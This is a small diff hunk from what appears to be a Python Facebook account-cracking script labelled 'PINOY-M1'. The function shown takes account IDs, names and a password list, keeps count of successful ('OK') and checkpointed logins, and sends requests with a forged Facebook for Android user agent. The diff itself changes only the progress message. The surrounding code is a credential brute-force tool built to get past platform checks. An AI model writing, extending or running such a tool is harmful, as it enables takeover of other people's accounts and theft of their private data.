@@ -251,7 +251,7 @@ def mmku():
 #==================[M1]==================#
 def graph(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r [PINOY-M1]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(cps)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;36m [PINOY-M1] %s|\033[0;37mOK:-%s \033[0;37m'%(loop,len(oks)));sys.stdout.flush()
     sys.stdout.flush()
     ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-A7070 Build/QP1A.190711.020) [FB4A/;FBAV/A1XDL5U4;FBBV/170261267;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/170261267;FBDM//*{density=2.0,width=720,height=4096};FBLC/ru_RU;FBRV/956349932;FBCR/TECNO;FBMF/Xiaomi;FBBD/OPhone;FBPN/com.facebook.katana;FBDV/LG_Velvet;FBSV/12;FBOP/4;FBCA/armeabi;FBSS/12;]'
     try:
